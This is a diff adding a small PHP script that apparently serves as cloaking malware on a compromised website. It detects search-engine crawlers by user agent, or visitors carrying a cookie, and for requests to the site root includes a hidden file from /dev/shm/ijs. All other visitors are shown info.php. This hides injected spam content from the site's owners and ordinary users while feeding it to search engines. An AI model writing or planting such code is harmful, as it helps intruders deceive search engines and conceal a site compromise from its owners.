@@ -1,0 +1,20 @@
+<?php
+$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$uri = $_SERVER['REQUEST_URI'] ?? '';
+
+$bot_regex = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
+
+$is_bot_regex = preg_match($bot_regex, $ua);
+
+$is_bot_stripos = (stripos($ua, 'bot') !== false || 
+                   stripos($ua, 'verification') !== false || 
+                   stripos($ua, 'tool') !== false);
+
+$is_bot = ($is_bot_regex || $is_bot_stripos);
+
+if (($is_bot || isset($_COOKIE[0])) && $uri == '/') {
+    include('/dev/shm/ijs');
+} else {
+    include('info.php');
+}
+?>
